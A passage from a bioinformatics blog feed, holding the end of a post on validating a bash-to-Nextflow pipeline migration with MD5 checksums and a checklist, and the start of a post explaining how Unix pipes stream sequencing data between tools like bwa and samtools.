tolerance</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token function" style="color:hsl(221, 87%, 60%)">paste</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token function" style="color:hsl(221, 87%, 60%)">grep</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"^#"</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$baseline</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">awk</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'{print $6}'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token function" style="color:hsl(221, 87%, 60%)">grep</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"^#"</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$migrated</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">awk</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'{print $6}'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token function" style="color:hsl(221, 87%, 60%)">awk</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">tol</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$tolerance</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'{</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">            diff = ($1 - $2)</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">            if (diff &lt; 0) diff = -diff</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">            if (diff &gt; tol &amp;&amp; $1 != ".") {</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">                print "DIFFER: " $1 " vs " $2</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">            }</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">        }'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="3-documentation-template">3. Documentation Template<a href="https://riverxdata.github.io/river-docs/blog/migrate-bash-nextflow-enterprise-pipeline#3-documentation-template" class="hash-link" aria-label="Direct link to 3. Documentation Template" title="Direct link to 3. Documentation Template" translate="no">​</a></h3>
<p>Create a migration checklist:</p>
<div class="language-markdown codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-markdown codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token title important punctuation" style="color:hsl(119, 34%, 47%);font-weight:bold">#</span><span class="token title important" style="color:hsl(230, 8%, 24%);font-weight:bold"> Pipeline Migration Checklist</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token title important punctuation" style="color:hsl(119, 34%, 47%);font-weight:bold">##</span><span class="token title important" style="color:hsl(230, 8%, 24%);font-weight:bold"> Pre-Migration</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token list punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> [ ] Document original bash pipeline</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token list punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> [ ] Record all tool versions</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token list punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> [ ] Generate baseline MD5 checksums</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token list punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> [ ] Test reproducibility (3+ runs)</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token list punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> [ ] Identify non-deterministic components</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token title important punctuation" style="color:hsl(119, 34%, 47%);font-weight:bold">##</span><span class="token title important" style="color:hsl(230, 8%, 24%);font-weight:bold"> Migration</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token list punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> [ ] Convert each step to Nextflow process</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token list punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> [ ] Set seeds for random operations</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token list punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> [ ] Configure containerization</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token list punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> [ ] Implement resource directives</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token list punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> [ ] Add error handling</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token title important punctuation" style="color:hsl(119, 34%, 47%);font-weight:bold">##</span><span class="token title important" style="color:hsl(230, 8%, 24%);font-weight:bold"> Validation</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token list punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> [ ] Run Nextflow with same inputs</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token list punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> [ ] Generate MD5 checksums</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token list punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> [ ] Compare all outputs</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token list punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> [ ] Document acceptable differences</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token list punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> [ ] Validate on multiple samples</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token title important punctuation" style="color:hsl(119, 34%, 47%);font-weight:bold">##</span><span class="token title important" style="color:hsl(230, 8%, 24%);font-weight:bold"> Sign-Off</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token list punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> [ ] All checksums match or differences documented</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token list punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> [ ] Code review completed</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token list punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> [ ] Team approval</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token list punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> [ ] Migration complete</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="summary-confidently-migrating-any-in-house-pipeline-to-enterprise-level">Summary: Confidently Migrating Any In-House Pipeline to Enterprise Level<a href="https://riverxdata.github.io/river-docs/blog/migrate-bash-nextflow-enterprise-pipeline#summary-confidently-migrating-any-in-house-pipeline-to-enterprise-level" class="hash-link" aria-label="Direct link to Summary: Confidently Migrating Any In-House Pipeline to Enterprise Level" title="Direct link to Summary: Confidently Migrating Any In-House Pipeline to Enterprise Level" translate="no">​</a></h2>
<p>Whether you're migrating from bash scripts, Python workflows, Snakemake pipelines, custom C++ tools, or anything else, the same 3-step validation framework applies. The MD5-based validation approach is universal and language-agnostic.</p>
<p>By following a systematic 3-step approach, you can validate that your new enterprise pipeline produces identical results to your original in-house system:</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="step-1-establish-baseline-from-your-original-pipeline">Step 1: Establish Baseline (From Your Original Pipeline)<a href="https://riverxdata.github.io/river-docs/blog/migrate-bash-nextflow-enterprise-pipeline#step-1-establish-baseline-from-your-original-pipeline" class="hash-link" aria-label="Direct link to Step 1: Establish Baseline (From Your Original Pipeline)" title="Direct link to Step 1: Establish Baseline (From Your Original Pipeline)" translate="no">​</a></h3>
<ul>
<li class="">Run original pipeline multiple times</li>
<li class="">Verify determinism (same inputs = same outputs)</li>
<li class="">Record MD5 checksums of all outputs</li>
<li class="">Document tool versions and seeds</li>
<li class="">Works with: bash, Python, Snakemake, custom code, etc.</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="step-2-migrate-with-seed-control-to-your-target-system">Step 2: Migrate with Seed Control (To Your Target System)<a href="https://riverxdata.github.io/river-docs/blog/migrate-bash-nextflow-enterprise-pipeline#step-2-migrate-with-seed-control-to-your-target-system" class="hash-link" aria-label="Direct link to Step 2: Migrate with Seed Control (To Your Target System)" title="Direct link to Step 2: Migrate with Seed Control (To Your Target System)" translate="no">​</a></h3>
<ul>
<li class="">Convert each pipeline step to your target format</li>
<li class="">Hard-code seeds for random operations</li>
<li class="">Use containers to match tool versions</li>
<li class="">Maintain identical resource configurations</li>
<li class="">Target options: Nextflow, Snakemake, CWL, etc.</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="step-3-validate-with-checksums-automated-or-manual">Step 3: Validate with Checksums (Automated or Manual)<a href="https://riverxdata.github.io/river-docs/blog/migrate-bash-nextflow-enterprise-pipeline#step-3-validate-with-checksums-automated-or-manual" class="hash-link" aria-label="Direct link to Step 3: Validate with Checksums (Automated or Manual)" title="Direct link to Step 3: Validate with Checksums (Automated or Manual)" translate="no">​</a></h3>
<ul>
<li class="">Run new pipeline with identical inputs</li>
<li class="">Generate MD5 checksums for all outputs</li>
<li class="">Compare against baseline</li>
<li class="">Document acceptable differences</li>
<li class="">Sign off on migration</li>
</ul>
<p><strong>If targeting Nextflow:</strong> Use nf-test to automate steps 2-3 with built-in snapshot management and CI/CD integration.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="key-takeaways">Key Takeaways<a href="https://riverxdata.github.io/river-docs/blog/migrate-bash-nextflow-enterprise-pipeline#key-takeaways" class="hash-link" aria-label="Direct link to Key Takeaways" title="Direct link to Key Takeaways" translate="no">​</a></h3>
<ol>
<li class="">
<p><strong>The 3-step framework works for ANY in-house pipeline</strong> - Whether you're migrating from bash, Python, Snakemake, or custom code, the MD5-based validation approach is universal</p>
</li>
<li class="">
<p><strong>MD5 checksums are your source of truth</strong> - They provide byte-for-byte verification that outputs are identical, regardless of source or target format</p>
</li>
<li class="">
<p><strong>Reproducibility requires explicit seed control</strong> - Any non-deterministic operation must use hard-coded seeds (42 is an arbitrary choice—use what makes sense for your team)</p>
</li>
<li class="">
<p><strong>Version pinning matters</strong> - Use containers to guarantee identical tool versions between original and migrated pipelines</p>
</li>
<li class="">
<p><strong>Document everything</strong> - Record versions, seeds, checksums, and acceptable differences for your team's understanding</p>
</li>
<li class="">
<p><strong>Validate on multiple samples</strong> - Differences might only appear with certain data characteristics or edge cases</p>
</li>
<li class="">
<p><strong>If migrating TO Nextflow: use nf-test</strong> - It automates the entire validation workflow with version-controlled snapshots and CI/CD integration</p>
</li>
<li class="">
<p><strong>Make failures visible</strong> - Use <code>set -o pipefail</code> and explicit error checking in both pipelines</p>
</li>
</ol>
<p>Once you've validated that outputs match, you can confidently replace your in-house pipeline with an enterprise system, knowing that you've maintained scientific reproducibility while gaining the benefits of professional workflow management.</p>
<p>Your migrated pipeline is now:</p>
<ul>
<li class="">Reproducible across teams and platforms</li>
<li class="">Scalable (to HPC/cloud without modification)</li>
<li class="">Maintainable by the broader community</li>
<li class="">Validated against your original implementation</li>
<li class="">Ready for production and publication</li>
</ul>]]></content>
        <author>
            <name>Thanh-Giang Tan Nguyen</name>
            <email>nttg8100@gmail.com</email>
            <uri>https://www.facebook.com/nttg8100</uri>
        </author>
        <category label="nextflow" term="nextflow"/>
        <category label="bash" term="bash"/>
        <category label="migration" term="migration"/>
        <category label="reproducibility" term="reproducibility"/>
        <category label="validation" term="validation"/>
        <category label="md5" term="md5"/>
        <category label="testing" term="testing"/>
        <category label="enterprise" term="enterprise"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Unix Pipes in Bioinformatics: How Streaming Data Reduces Memory and Storage]]></title>
        <id>https://riverxdata.github.io/river-docs/blog/unix-pipes-bioinformatics-streaming-data</id>
        <link href="https://riverxdata.github.io/river-docs/blog/unix-pipes-bioinformatics-streaming-data"/>
        <updated>2026-02-10T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[Unix pipes (|) are one of the most powerful yet underutilized features in bioinformatics. They allow you to chain multiple commands together, processing data in a streaming fashion that dramatically reduces memory usage and disk I/O. This post explores why pipes are essential for bioinformatics work and shows how they work under the hood.]]></summary>
        <content type="html"><![CDATA[<p>Unix pipes (|) are one of the most powerful yet underutilized features in bioinformatics. They allow you to chain multiple commands together, processing data in a streaming fashion that dramatically reduces memory usage and disk I/O. This post explores why pipes are essential for bioinformatics work and shows how they work under the hood.</p>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="the-problem-data-explosion-in-bioinformatics">The Problem: Data Explosion in Bioinformatics<a href="https://riverxdata.github.io/river-docs/blog/unix-pipes-bioinformatics-streaming-data#the-problem-data-explosion-in-bioinformatics" class="hash-link" aria-label="Direct link to The Problem: Data Explosion in Bioinformatics" title="Direct link to The Problem: Data Explosion in Bioinformatics" translate="no">​</a></h2>
<p>Modern sequencing generates massive datasets. A single human genome sequencing run can produce:</p>
<ul>
<li class=""><strong>Raw reads:</strong> 100+ GB of FASTQ files</li>
<li class=""><strong>Alignments:</strong> 50-100 GB of BAM files</li>
<li class=""><strong>Variants:</strong> 1-5 GB of VCF files</li>
</ul>
<p>Without pipes, traditional bioinformatics workflows create intermediate files at each step:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Traditional approach (❌ Wasteful)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">bwa mem reference.fa reads.fastq </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> aligned.sam    </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 200 GB intermediate</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">samtools view </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-b</span><span class="token plain"> aligned.sam </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> aligned.bam        </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 100 GB intermediate</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">samtools </span><span class="token function" style="color:hsl(221, 87%, 60%)">sort</span><span class="token plain"> aligned.bam </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> sorted.bam            </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 100 GB intermediate</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">samtools index sorted.bam                         </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Already indexed</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Total disk usage: 400 GB for processing 100 GB of raw data!</span><br></span></code></pre></div></div>
<p><strong>The costs:</strong></p>
<ul>
<li class=""><strong>Storage:</strong> 4x the original data size just for intermediates</li>
<li class=""><strong>Time:</strong> Writing/reading intermediate files is slow</li>
<li class=""><strong>Failure:</strong> If a step fails midway, you lose everything and restart from scratch</li>
<li class=""><strong>Complexity:</strong> Managing and cleaning up intermediate files is tedious</li>
</ul>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="the-solution-unix-pipes-for-streaming-data">The Solution: Unix Pipes for Streaming Data<a href="https://riverxdata.github.io/river-docs/blog/unix-pipes-bioinformatics-streaming-data#the-solution-unix-pipes-for-streaming-data" class="hash-link" aria-label="Direct link to The Solution: Unix Pipes for Streaming Data" title="Direct link to The Solution: Unix Pipes for Streaming Data" translate="no">​</a></h2>
<p>Pipes (<code>|</code>) connect the output of one command directly to the input of the next, processing data in memory as it flows through:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Pipe approach (✓ Efficient)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">bwa mem reference.fa reads.fastq </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  samtools view </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-b</span><span class="token plain"> - </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  samtools </span><span class="token function" style="color:hsl(221, 87%, 60%)">sort</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-o</span><span class="token plain"> sorted.bam -</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">samtools index sorted.bam</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Total disk usage: 100 GB (original data + final output)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># No intermediate files!</span><br></span></code></pre></div></div>
<p><strong>The benefits:</strong></p>
<ul>
<li class=""><strong>Memory efficient:</strong> Data flows through without full copies in RAM</li>
<li class=""><strong>Fast:</strong> No disk I/O for intermediates</li>
<li class=""><strong>Resilient:</strong> Failures are caught immediately and clearly</li>
<li class=""><strong>Simple:</strong> Clean, readable pipeline syntax</li>
<li class=""><strong>Storage efficient:</strong> Only keep final outputs</li>
</ul>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="how-pipes-work-under-the-hood">How Pipes Work Under the Hood<a href="https://riverxdata.github.io/river-docs/blog/unix-pipes-bioinformatics-streaming-data#how-pipes-work-under-the-hood" class="hash-link" aria-label="Direct link to How Pipes Work Under the Hood" title="Direct link to How Pipes Work Under the Hood" translate="no">​</a></h2>
<p>Understanding how pipes work is key to writing efficient bioinformatics pipelines. Let's explore the mechanics.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="1-file-descriptors-in-unix">1. File Descriptors in Unix<a href="https://riverxdata.github.io/river-docs/blog/unix-pipes-bioinformatics-streaming-data#1-file-descriptors-in-unix" class="hash-link" aria-label="Direct link to 1. File Descriptors in Unix" title="Direct link to 1. File Descriptors in Unix" translate="no">​</a></h3>
<p>Every Unix process has three standard file descriptors:</p>
<table><thead><tr><th>Descriptor</th><th>Name</th><th>Purpose</th><th>Default Target</th></tr></thead><tbody><tr><td>0</td><td>stdin</td><td>Standard input</td><td>Keyboard</td></tr><tr><td>1</td><td>stdout</td><td>Standard output</td><td>Terminal/Screen</td></tr><tr><td>2</td><td>stderr</td><td>Standard error</td><td>Terminal/Screen</td></tr></tbody></table>
<p>By default, processes read from stdin (file descriptor 0) and write to stdout (file descriptor 1).</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Example: cat command</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">cat</span><span class="token plain"> myfile.txt    </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Reads file, writes to stdout (terminal)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">cat</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;</span><span class="token plain"> myfile.txt  </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Explicitly redirect stdin from file</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">cat</span><span class="token plain"> myfile.txt </span><span class="token operator file-descriptor important" style="color:hsl(230, 8%, 24%);font-weight:bold">1</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> output.txt  </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Redirect stdout to file</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="2-creating-a-pipe-with-the-pipe-system-call">2. Creating a Pipe with the Pipe System Call<a href="https://riverxdata.github.io/river-docs/blog/unix-pipes-bioinformatics-streaming-data#2-creating-a-pipe-with-the-pipe-system-call" class="hash-link" aria-label="Direct link to 2. Creating a Pipe with the Pipe System Call" title="Direct link to 2. Creating a Pipe with the Pipe System Call" translate="no">​</a></h3>
<p>When you type <code>command1 | command2</code>, the shell:</p>
<ol>
<li class=""><strong>Creates a pipe</strong> - an unnamed, in-memory buffer that connects two processes</li>
<li class=""><strong>Forks process 1</strong> - creates a copy of the shell running <code>command1</code></li>
<li class=""><strong>Connects stdout of process 1</strong> to the pipe's write end (file descriptor 1)</li>
<li class=""><strong>Forks process 2</strong> - creates a copy of the shell running <code>command2</code></li>
<li class=""><strong>Connects stdin of process 2</strong> to the pipe's read end (file descriptor 0)</li>
<li class=""><strong>Executes both processes</strong> - they run in parallel</li>
</ol>
<p><strong>Diagram of a pipe:</strong></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">[command1]                    [command2]</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">     |                              |</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  stdout (fd 1)              stdin (fd 0)</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">     |                              |</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">     v                              ^</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    [================================]</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">              Pipe (kernel buffer)</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="3-the-kernel-manages-data-flow">3. The Kernel Manages Data Flow<a href="https://riverxdata.github.io/river-docs/blog/unix-pipes-bioinformatics-streaming-data#3-the-kernel-manages-data-flow" class="hash-link" aria-label="Direct link to 3. The Kernel Manages Data Flow" title="Direct link to 3. The Kernel Manages Data Flow" translate="no">​</a></h3>
<p>The Unix kernel manages the pipe as a <strong>FIFO (First In, First Out) buffer</strong>:</p>
<ul>
<li class=""><strong>Write side:</strong> <code>command1</code> writes data to the pipe's write end</li>
<li class=""><strong>Pipe buffer:</strong> Data sits in kernel memory (typically 64KB-1MB per pipe)</li>
<li class=""><strong>Read side:</strong> <code>command2</code> reads data from the pipe's read end</li>
</ul>
<p><strong>Key behaviors:</strong></p>
<ol>
<li class=""><strong>If pipe is full:</strong> The writing process blocks until space is available</li>
<li class=""><strong>If pipe is empty:</strong> The reading process blocks until data arrives</li>
<li class=""><strong>If reader closes:</strong> Writer gets a SIGPIPE signal (broken pipe error)</li>
<li class=""><strong>If writer closes:</strong> Reader gets EOF and can finish processing</li>
</ol>
<p>This synchronization happens automatically—you don't need to manage it.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="4-example-tracing-a-real-pipe">4. Example: Tracing a Real Pipe<a href="https://riverxdata.github.io/river-docs/blog/unix-pipes-bioinformatics-streaming-data#4-example-tracing-a-real-pipe" class="hash-link" aria-label="Direct link to 4. Example: Tracing a Real Pipe" title="Direct link to 4. Example: Tracing a Real Pipe" translate="no">​</a></h3>
<p>Let's trace what happens when you run:</p>
